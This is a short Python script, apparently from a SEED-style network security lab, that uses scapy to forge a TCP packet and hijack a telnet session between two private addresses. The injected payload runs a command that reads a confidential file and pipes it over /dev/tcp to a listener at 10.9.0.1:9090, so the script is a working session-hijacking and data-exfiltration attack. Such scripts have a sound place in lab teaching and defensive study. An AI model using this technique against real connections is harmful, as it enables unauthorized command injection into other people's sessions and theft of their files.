#!/usr/bin/env python3
from scapy.all import *

ip = IP(src="10.9.0.6", dst="10.9.0.5")

tcp = TCP(
    sport=39494,
    dport=23,
    flags="A",
    seq=3227746009,
    ack=2164760030
)

data = "\ncat /home/seed/confidential/secret.txt > /dev/tcp/10.9.0.1/9090\n"

pkt = ip/tcp/data

send(pkt, verbose=0)
